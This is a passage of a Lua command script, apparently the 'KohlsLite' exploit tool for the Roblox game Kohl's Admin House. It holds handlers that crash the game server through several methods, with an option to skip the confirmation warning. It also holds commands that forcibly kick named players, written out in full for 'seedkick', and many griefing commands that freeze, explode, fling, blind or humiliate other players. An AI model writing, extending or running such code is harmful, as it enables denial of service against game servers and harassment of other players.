                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movebb' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end        

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'toregen' then
        regentp()
	Remind("Teleported to the regen (if it's loaded)")
    end
	
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'rparts' then
	for i,v in pairs(workspace.Terrain["_Game"].Folder:GetChildren()) do
		if v:IsA("Part") and v.Name == "Part" then
			v:Destroy()
		end
	end
	Remind("Removed Persons parts")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'lrobb' then
         LocalObby("remove")
	 Remind("Removed the obby client-side")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'laobb' then
         LocalObby("add")
	 Remind("Added the obby client-side")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'findregen' then -- i know it sucks but perm exists lol
        regenfind = true
	Remind("Finding the regen (skydived)")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'nofindregen' then
        regenfind = false
	Remind("Stopped the regen (skydived)")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'2findregen' then -- i know it sucks but perm exists lol
        regenfind2 = true
	Remind("Finding the regen (KL/CMD-Y)")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'2nofindregen' then
        regenfind2 = false
	Remind("Stopped the regen (KL/CMD-Y)")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'leakedreg' then -- i know it sucks but perm exists lol
        leakedcords()
	Remind("Checking leaked coords for the regen!")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'unpmu' then
        mymusiconly = false
        musicoff = true
        Chat("stopmusic")
        Remind("Perm music is off")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'offmusic' then
        musicoff = true
        Chat("stopmusic")
	Remind("Perm music is now paused.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'onmusic' then
        musicoff = false
	Remind("Perm music is no longer paused.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'remusic' then
               Chat(prefix.."startm")
     end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'equipall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                end
		Remind("Equipped all items in your inventory!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'actall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                             v:Activate()
                end
		Remind("Activated all items in your inventory!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'invall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                local Character = game.Players.LocalPlayer.Character
                for _, v in ipairs(Character:GetChildren()) do
                         if v:IsA("Tool") then
                                    v.Parent = Backpack
                         end
                end
		Remind("Unequipped all items in your inventory!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'dropall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                local Character = game.Players.LocalPlayer.Character
                for _, v in ipairs(Character:GetChildren()) do
                         if v:IsA("Tool") then
                                    v.Parent = Backpack
                         end                
                end
                for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = workspace
                end
		Remind("Dropped all items in your inventory!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'vgcrash' then
	if skipwarncrash then -- idea from sinx
		VGCrash()
		Remind("VG Crashed the server.")
	else
		local response = Instance.new("BindableFunction")
		function response.OnInvoke(answer)
			if answer == "Yes" then
		    		VGCrash()
				Remind("VG Crashed the server.")
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "Are you sure about this?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
		})
	end
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cocrash' then
	if skipwarncrash then -- idea from sinx
		CoCrash()
		Remind("VG Crashed (2) the server.")
	else
		local response = Instance.new("BindableFunction")
		function response.OnInvoke(answer)
			if answer == "Yes" then
		    		CoCrash()
				Remind("VG Crashed (2) the server.")
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "Are you sure about this?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
		})
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'emcrash' then
	if skipwarncrash then -- idea from sinx
		EmCrash()
		Remind("Emerald Crashed the server.")
	else
		local response = Instance.new("BindableFunction")
		function response.OnInvoke(answer)
			if answer == "Yes" then
		    		EmCrash()
				Remind("Emerald Crashed the server.")
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "Are you sure about this?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
		})
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pcrash' then
	if skipwarncrash then -- idea from sinx
		PCrash()
		Remind("Orinthian Crashed the server.")
	else
		local response = Instance.new("BindableFunction")
		function response.OnInvoke(answer)
			if answer == "Yes" then
		    		PCrash()
				Remind("Orinthian Crashed the server.")
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "Are you sure about this?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
		})
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fcrash' then
	if skipwarncrash then -- idea from sinx
		FCrash()
		Remind("Freeeze Crashed the server.")
	else
		local response = Instance.new("BindableFunction")
		function response.OnInvoke(answer)
			if answer == "Yes" then
		    		FCrash()
				Remind("Freeze Crashed the server.")
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "Are you sure about this?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
		})
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'dcrash' then
	if skipwarncrash then -- idea from sinx
		DCrash()
		Remind("Dog Crashed the server.")
	else
		local response = Instance.new("BindableFunction")
		function response.OnInvoke(answer)
			if answer == "Yes" then
		    		DCrash()
				Remind("Dog Crashed the server.")
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "Are you sure about this?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
		})
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'scrash' then -- not a silent crash!
        if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: shield]])
        else
		if skipwarncrash then -- idea from sinx
			SCrash()
			Remind("Shield Crashed the server.")
		else
			local response = Instance.new("BindableFunction")
			function response.OnInvoke(answer)
				if answer == "Yes" then
		    			SCrash()
					Remind("Shield Crashed the server.")
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "KohlsLite Manager",
				Text = "Are you sure about this?",
				Duration = math.huge,
				Callback = response,
				Button1 = "Yes",
				Button2 = "No"
			})
		end
        end
    end

   if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'swc' then
			skipwarncrash = true
			Remind("Warning for crashing disabled.")
   end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'unswc' then
			skipwarncrash = false
			Remind("A warning will now appear whenever you want to crash.")
   end
		
   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'rkick' then
        if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: rocket]])
        else
                local dasplayer = string.sub(msg:lower(), #prefix + 7)
                   PLAYERCHECK(dasplayer)
                   if player ~= nil and not table.find(nokick, player) then
                        rkickplr(cplr,player)
                        Remind("Rocket kicking "..player)
                elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else                        
                        Remind('Cannot find player with the name: '..dasplayer)
                   end
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unrkick' then
		if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: rocket]])
return
		end
		if rkicking then
			rkicking = false
			Remind("Stopped rocket kicking player")
		end
		Chat("unrocket/all/all/all")
		Chat("respawn me "..player)
		Chat("removejails")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'seedkick' then 
		Remind("This kick was found by Digitality.") 
		local dasplayer = string.sub(msg:lower(), #prefix + 10)
                PLAYERCHECK(dasplayer)
	
                if player ~= nil and not table.find(nokick, player) then
			kickin = cplr
			kickinplr = player
                        Remind("Kicking "..player)
                elseif table.find(nokick, player) then
                        return Remind("Sorry, this player cannot be kicked!")
                else                        
                        return Remind('Cannot find player with the name: '..dasplayer)
                end
	
		Chat("speed "..kickinplr.." 0")
		task.wait()
		game.Players.LocalPlayer.Character:PivotTo(kickin.Character:GetPivot())
		task.wait(.3)
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                for _, v in ipairs(Backpack:GetChildren()) do
			if v.Name == "BitePlant" then 
				v.Parent = game.Players.LocalPlayer.Character
				task.wait(0)
				v:Activate() 
			end
		end 
		Chat("punish me")
		task.wait(.5)
		Chat("unpunish me")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'meshkick' then  -- mesh kick haha
		local dasplayer = string.sub(msg:lower(), #prefix + 10)
                PLAYERCHECK(dasplayer)
	
                if player ~= nil and not table.find(nokick, player) then
			kickin = cplr
			kickinplr = player
                        Remind("Kicking "..player)
			hatkick(kickin, kickinplr)
                elseif table.find(nokick, player) then
                        return Remind("Sorry, this player cannot be kicked!")
                else                        
                        return Remind('Cannot find player with the name: '..dasplayer)
                end
	
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'hatkick' then  -- hat kick haha
		local dasplayer = string.sub(msg:lower(), #prefix + 9)
                PLAYERCHECK(dasplayer)
	
                if player ~= nil and not table.find(nokick, player) then
			kickin = cplr
			kickinplr = player
                        Remind("Kicking "..player)
			hatkick(kickin, kickinplr)
                elseif table.find(nokick, player) then
                        return Remind("Sorry, this player cannot be kicked!")
                else                        
                        return Remind('Cannot find player with the name: '..dasplayer)
                end
	
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'techkick' then  -- tech kick
		local dasplayer = string.sub(msg:lower(), #prefix + 10)
                PLAYERCHECK(dasplayer)
	
                if player ~= nil and not table.find(nokick, player) then
			kickin = cplr
			kickinplr = player
                        Remind("Kicking "..player)
			techkick(kickin, kickinplr)
                elseif table.find(nokick, player) then
                        return Remind("Sorry, this player cannot be kicked!")
                else                        
                        return Remind('Cannot find player with the name: '..dasplayer)
                end
	
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antimesh' then 
		antimesh = true
		Remind("Anti mesh/hat kick enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantimesh' then 
		antimesh = false
		Remind("Anti mesh/hat kick disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antihat' then 
		antimesh = true
		Remind("Anti mesh/hat kick enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantihat' then 
		antimesh = false
		Remind("Anti mesh/hat kick disabled.")

    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'welmsg' then
        welcomemsg = true
	Remind("The welcome/leaving message has been enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unwelmsg' then
        welcomemsg = false
	Remind("The welcome/leaving message has been disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antian' then
        crash_an = true
	Remind("Antis are announced when triggered.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantian' then
        crash_an = false
	Remind("Antis are no announced when triggered.")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'clickexplode' then
        clickexplode = true
	Remind("Click a player and they'll explode!")
    end

    if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'unclickexplode' then
        clickexplode = false
	Remind("Players will no longer explode when you click them, phew!")
    end

  if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cakeday' then
                local args = string.split(msg, " ")
		if #args == 2 then
                	local caketar = args[2]
			PLAYERCHECK(caketar)
         		if player ~= nil then
                  		caketarsuccess = player
				Chat("h \n\n\n Happy birthday, ".. caketarsuccess .."! \n\n\n")
         		else
                		Remind('Cannot find player with the name: '..caketar)
         		end
		else
				
			local atprogcakeday = "08/23" -- atprog's birthday
			local spcakeday = "04/28" -- 

			local ctime = os.date("%m/%d")

			if ctime == atprogcakeday then			
				Chat("h \n\n\n Happy birthday, atprog! \n\n\n")
				Speak("Happy birthday, atprog!")
			elseif ctime == spcakeday then
				Chat("h \n\n\n Happy birthday, s_p! \n\n\n")
				Speak("Happy birthday, s_p!")
			else
				Remind("It is not atprog's/s_p's birthday today. If it is someone else's birthday in the server, provide the second argument.")
			end
		end
    end
		
    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'control' then -- really funny ngl (scv1)
                local dogman = string.sub(msg:lower(), #prefix + 9)
                Chat("speed "..dogman.." 0")
                Chat("dog me "..dogman)
                Chat("tp me "..dogman)
                task.wait(1)
                Chat("punish me "..dogman)
                Chat("undog me "..dogman)
                task.wait(0.25)
                Chat("unpunish me "..dogman)
                Chat("invis me")
                Remind("You should be attached to the player!")
    end

		-- broken command
    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'ncontrol' then -- really funny ngl (cmdpi)
        	local dasplayer = string.sub(msg:lower(), #prefix + 10)
                PLAYERCHECK(dasplayer)
                if player ~= nil then
			Chat('size me nan')
			Chat('invis me')
			Chat('stun ' .. player)
	 		Mover:pingWait() 
			Mover:Attach(cplr.Character.Torso)
            		Chat('size me nan')
                        Remind("Attaching to "..player)
                else                        
                        Remind('Cannot find player with the name: '..dasplayer)
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'iceblock' then -- pr script
                local theblock = string.sub(msg:lower(), #prefix + 10)
                if theblock == "me" then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,-40,0)
                end
                task.wait(0.25)
                  Chat("invisible "..theblock); task.wait()
                    Chat("freeze "..theblock);task.wait()
                Chat("size "..theblock.." 10");task.wait()
                Chat("clone "..theblock);task.wait()
                Chat("respawn "..theblock)
		Remind("Created a big ice block!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'glitch' then -- noobsploit
		local dosd = string.sub(msg:lower(), #prefix + 8)
		Chat("gear me 71037101")
 		repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("DaggerOfShatteredDimensions")
        	dagg = game.Players.LocalPlayer.Backpack:FindFirstChild("DaggerOfShatteredDimensions")
        	task.wait()
        	dagg.Parent = game.Players.LocalPlayer.Character
		task.wait()
		Chat("god "..dosd)
		Chat("tp "..dosd.." me")
		game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.Q,false,game)
		task.wait(2)
		Chat("reset me")
    end
		
    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'headrise' then -- jotunnheim
		local hrise = string.sub(msg:lower(), #prefix + 10)	
		Chat("size " .. hrise .. " .3")
                Chat("bighead " .. hrise);task.wait()
                Chat("size " .. hrise .. " 10");task.wait()
                Chat("thaw " .. hrise);task.wait()
                Chat("unsize " .. hrise)
		Remind("Headrised player.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'headroot' then -- jotunnheim
		local hroot = string.sub(msg:lower(), #prefix + 10)	
		Chat("size " .. hroot .. " 10");task.wait()
                Chat("freeze " .. hroot);task.wait()
                Chat("bighead " .. hroot);task.wait()
                Chat("size " .. hroot .. " .3");task.wait()
                Chat("thaw " .. hroot);task.wait()
                Chat("unsize " .. hroot)
		Remind("Headrooted player.")
    end
		
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'skybox' then -- jotunnheim
		local skbox = string.sub(msg:lower(), #prefix + 8)	
		Chat("size " .. skbox .. " .3")
                Chat("freeze " .. skbox)
                Chat("size " .. skbox .. " 10")
                Chat("goldify " .. skbox)
                Chat("clone " .. skbox)
                Chat("reset " .. skbox)
		Remind("Skyboxed player.")
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'amputate' then -- jotunnheim
		local amp = string.sub(msg:lower(), #prefix + 10)	
		Chat("size " .. amp .. " 10")
                task.wait(.3)
                Chat("freeze " .. amp)
                task.wait(.3)
                Chat("trip " .. amp)
                task.wait(.3)
                Chat("unsize " .. amp)
                task.wait(.3)
                Chat("paint " .. amp .. " red")
		Remind("Amputated player.")
    end
		
    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'icetower' then -- jotunnheim
		local icet = string.sub(msg:lower(), #prefix + 10)
		for i = 1, 30 do
                    Chat("size " .. icet .. " .6")
                    Chat("seizure " .. icet)
                    Chat("freeze " .. icet)
                    Chat("unsize " .. icet)
                end
    end
				
    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'coconut' then -- noobsploit
		local coco = string.sub(msg:lower(), #prefix + 9)
		Chat("char "..coco.." 5")
		Chat("paint "..coco.." brown")
		for i = 1, 5 do
			Chat("size "..coco.." .3")
		end
		Chat("unsize "..coco)
		Chat("size "..coco.." 2")
		task.wait(0.3)
		Chat("paint "..coco.." brown")
		Remind("The player should now be a coconut!")
    end
		
    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cube' then -- cmdv3/pi
                local imacube = string.sub(msg:lower(), #prefix + 6)
                Chat("unpackage "..imacube)
                for i = 1,15 do
                        task.wait()
                        Chat("size " .. imacube .. " .3")
                    end
                Chat("paint " .. imacube .. " white")
                Chat("bighead " .. imacube)
                Chat("unsize " .. imacube)
                Chat("removelimbs " .. imacube)
                Chat("size " .. imacube .. " 2.5")
                Chat("shiny " .. imacube)
                Remind("The player should now be a cube!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'tank' then -- thomas the tank engine - from yt video
                local thomas = string.sub(msg:lower(), #prefix + 6)
		Chat("removelimbs "..thomas);task.wait(0.5)
		Chat("dog "..thomas);task.wait(0.5)
		Chat("creeper "..thomas)
                Remind("The player should now be a tank!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'ufo' then -- ufo!!! scv1
                local ufo = string.sub(msg:lower(), #prefix + 5)
		for i = 1, 7 do
			Chat("size "..ufo.." 0.3")
		end
		Chat("unsize "..ufo)
		Chat("size "..ufo.." 4")
		Chat("paint "..ufo.." brown")
		task.wait(0.25)
		Chat("removelimbs "..ufo)
		Chat("dog "..ufo)
		Chat("rainbowify "..ufo)
		Chat("spin "..ufo)
                Remind("The player should now be a ufo!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'rat' then -- scv1
	        local eww = string.sub(msg:lower(), #prefix + 5)
		Chat("char "..eww.." 6")
		task.wait(1)
		Chat("hat "..eww.." 6203125039")
		Chat("size "..eww.." 0.8")
		Chat("speed "..eww.." 26")
		Remind("Turned player into a rat, yuck!")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'titan' then -- yeah im adding scv1 cmds lol
	        local thatanime = string.sub(msg:lower(), #prefix + 7)
		Chat("char "..thatanime.." 4")
		task.wait(1)
		Chat("skydive "..thatanime)
		Chat("paint "..thatanime.." red")
		Chat("size "..thatanime.." 5")
		Chat("speed "..thatanime.." 24")
		Chat("pants "..thatanime.." 1187508947")
		Remind("Turned player into a titan!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'speaker' then -- yeah im adding scv1 cmds lol
	        local spek = string.sub(msg:lower(), #prefix + 9)
		Chat("char "..spek.." 1702851506")
		task.wait(1.2)
		Chat("skydive "..spek.."")
		task.wait(.35)
		Chat("size "..spek.." 0.3")
		Chat("size "..spek.." 0.3")
		Chat("creeper "..spek.."")
		Chat("paint "..spek.." black")
		Chat("size "..spek.." 10")
		Chat("size "..spek.." 5")
		Chat("speed "..spek.." 32")
		task.wait(0.5)
		Chat("paint "..spek.." black")
		Remind("Turned player into a speaker!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'dogrock' then -- noobsploit/shazam
		local drock = string.sub(msg:lower(), #prefix + 9)
		Chat("dog "..drock)
		task.wait(0.25)
		Chat("size "..drock.." 0.3")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'rdogrock' then -- noobsploit/shazam
		local drock = string.sub(msg:lower(), #prefix + 10)
		Chat("trail "..drock.." rainbow")
		Chat("dog "..drock)
		task.wait(0.25)
		Chat("size "..drock.." 0.3")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'taxi' then -- kohlsnoob
	        local target = string.sub(msg:lower(), #prefix + 6)
		Chat("dog "..target)
		Chat("paint "..target.." gold")
		Chat("speed "..target.." 100")
		Chat("trail "..target.." gold")
		Chat("god "..target)
		Chat("unhat "..target)
		Remind("Turned player into a taxi!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'smoothie' then -- kohlsnoob
	        local daddyhelpmee = string.sub(msg:lower(), #prefix + 10)
		Chat("jail "..daddyhelpmee)
		Chat("stun "..daddyhelpmee)
		Chat("spin "..daddyhelpmee)
		Chat("fire "..daddyhelpmee)
		Remind("Blendered the player!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'tnt' then -- sHaZam!
	        local iduckingexplodedinmypants = string.sub(msg:lower(), #prefix + 5)
		Chat("removepants "..iduckingexplodedinmypants)
		Chat("removeshirt "..iduckingexplodedinmypants)
		Chat("paint "..player.." red")
		task.wait(1)
		Chat("bonfire "..iduckingexplodedinmypants)
		task.wait(2)
		Chat("explode "..iduckingexplodedinmypants)
		Remind("KABLAM!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'headfloat' then -- yeah im adding scv1 cmds lol
	        local hf = string.sub(msg:lower(), #prefix + 11)
		Chat("size "..hf.." 0.5")
		task.wait(0.25)
		Chat("bighead "..hf)
		task.wait(0.25)
		Chat("unsize "..hf)
	        Remind("The player's head should now be floating!")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'space' then -- kohls true anti kill
		if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: rocket]])
return
		end
                local person = string.sub(msg:lower(), #prefix + 7)
                Chat("h \n\n\n Guys, we've finally done it! \n\n\n");task.wait(4)
                Chat("h \n\n\n We're sending someone to space! \n\n\n");task.wait(4)
                Chat("h \n\n\n Are we ready? Hopefully our volunteer is too! Here we go! \n\n\n")
                Chat("time 0")
                Chat("rocket/" ..person) -- if they jump then i don't care ngl
                Chat("jail "..person) -- ok maybe i do care
                Chat("spin " ..person);task.wait(4)
                Chat("h \n\n\n LIFT OFF! \n\n\n")
                Chat("unjail "..person)
                Chat("jump " ..person);task.wait(2)
                Chat("explode " ..person);task.wait(2)
                Chat("reload "..person)
                Chat("blind others")
                Chat("h \n\n\n No one saw that, right? \n\n\n");task.wait(4)
                Chat("unblind others")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'tripin' then -- pr
                local person = string.sub(msg:lower(), #prefix + 8)
                Chat("h \n\n\n WOAH, LOOK OVER THERE! THAT GUY'S ASCENDING! \n\n\n")
                Chat("music 9061674082")
                Chat("setgrav "..person.." -256")
                Chat("trip "..person)
                task.wait(0.4)
                Chat("trip "..person)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ascend' then -- kohlsnoob
                local person = string.sub(msg:lower(), #prefix + 8)
		Chat("h \n\n\n and they go \n\n\n")
		chat("unfly "..person)
		chat("setgrav "..person.." -270")
		chat("stun "..person)
		chat("glow "..person.." 0 0 255")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'bed' then -- noobsploit techno
                local person = string.sub(msg:lower(), #prefix + 5)
                Chat("size "..person.." nan");task.wait()
                Chat("dog "..person.."");task.wait(.2)
                Chat("size "..person.." 2.60");task.wait()
                Chat("paint "..person.." white");task.wait()
                Chat("removelimbs "..person);task.wait(.2)
                Chat("speed "..person.." 24")
                Chat("paint "..person.." white")
                Remind("The player should now be a bed!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'kitten' then -- nak3d would get tagged, inspired by simplekah
                local meow = string.sub(msg:lower(), #prefix + 8)
                PLAYERCHECK(meow)
                if player ~= nil then
                         kit = cplr
                         if kit and kit.Character and kit.Character.Head then
                                    Chat("paint "..kit.Name.." "..kit.Character.Head.BrickColor.Name)
				    Remind("Painted the player to be nak3d!")
                         end
                 else
                        Remind('Cannot find player with the name: '..meow)
                 end
    end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'smack' then -- pr
                local person = string.sub(msg:lower(), #prefix + 7)
                Chat("music 5886215922")
                Chat("speed "..person.." 0")
                Chat("tp "..person.." me")
                task.wait(0.8)
                Speak("SMACK!")
                Chat("/e point")
                Chat("fling "..person)
                task.wait(1.45)
                Chat("explode "..person)
                Chat("music nan")
    end

   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'dumb' then -- pr
                local dum = string.sub(msg:lower(), #prefix + 6)
                PLAYERCHECK(dum)        
                if player ~= nil then
                        dummy = player
                        idum = cplr
                        DumbGuy()
                else
                        Remind('Cannot find player with the name: '..dum)
                end

    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'bend' then -- pr/cxodek script
		if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: rocket]])
return
		end
		if bending then return 
		else
			bending = true
                	local bendin = string.sub(msg:lower(), #prefix + 6)
                	Chat("rocket/"..bendin);task.wait(.5)
                	Chat("freeze "..bendin)
                	Chat("unrocket/"..bendin);task.wait(.34)
                	Chat("name "..bendin.." "..bendin);task.wait(.34)
                	Chat("thaw "..bendin);task.wait(.34)
                	Chat("unseizure "..bendin)
                	Chat("tp "..bendin.." "..bendin)
                	Chat("sit "..bendin)
			Remind("The player should be ready... for uhhhh")
			bending = false
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'ruin' then -- pr/vitalux script
                local rrrr = string.sub(msg:lower(), #prefix + 6)
		Chat("unpunish "..rrrr);task.wait()
	--	Chat("invis "..rrrr)
		Chat("reset "..rrrr)
	--	Chat("invis "..rrrr)
		Chat("kill "..rrrr)
		Chat("trip "..rrrr)
		Chat("setgrav "..rrrr.." -inf");task.wait(.1)
	--	Chat("invis "..rrrr)
		Chat("unpunish "..rrrr.." "..rrrr.." "..rrrr);task.wait(.2)
	--	Chat("invis "..rrrr)task.wait(.2)
		Chat("reset "..rrrr);task.wait(.15)
		Chat("punish "..rrrr.." "..rrrr.." "..rrrr)
		Remind("Broke/glitched the player.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fspin' then -- kohlsnoob
                local target = string.sub(msg:lower(), #prefix + 7)
		Chat("unfly "..target)
		Chat("nograv "..target)
		Chat("stun "..target)
		Chat("spin "..target)
		Remind("Float spinned the player.")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'yeet' then -- kohlsnoob
                local yeetusmcgleetus = string.sub(msg:lower(), #prefix + 6)
		Chat("sit "..yeetusmcgleetus)
		Chat("nograv "..yeetusmcgleetus)
		Chat("ff "..yeetusmcgleetus)
		for i = 1, 5 do
			chat("explode "..yeetusmcgleetus)
		end
		Remind("Your victim has been to who knows where")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'creeper' then -- kohlsnoob
		local pearlharbour = string.sub(msg:lower(), #prefix + 9)
		Chat("h \n\n\n UH OH, IS THAT A CREEPER? RUN!!! \n\n\n")
		Chat("unff "..pearlharbour)
		chat("removehats "..pearlharbour)
		chat("creeper "..pearlharbour)
		local woahwoahwoah = "red"
		task.wait(1)
		local e = nil
		for i = 1,20 do
			chat("paint "..pearlharbour.." "..woahwoahwoah)
			if woahwoahwoah == "red" then 
				woahwoahwoah = "green"
			else
				woahwoahwoah = "red"
			end
			if i < 11 then
				task.wait(((10-i) *.1) + (i * .005))
				if i == 10 then
					e = ((10-i) *.1) + (i*.005)
				end
			else
				task.wait(e)
			end
		end
		task.wait()
		chat("explode "..pearlharbour)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'gbreak' then -- pr script
		local golding = string.sub(msg:lower(), #prefix + 8)
		Chat("freeze " .. golding)
                for i = 1, 100 do
                    Chat("dog " .. golding)
                end
                task.wait(.4)
                for i = 1, 100 do
                    Chat("dog " .. golding)
                end
                task.wait(.1)
                Chat("goldify " .. golding)
                task.wait(.2)
                Chat("thaw " .. golding)
                task.wait(.2)
                Chat("explode " .. golding)
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antidisco' then
        antidisco = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantidisco' then
        antidisco = false
	Remind("Disable this anti!")
    end

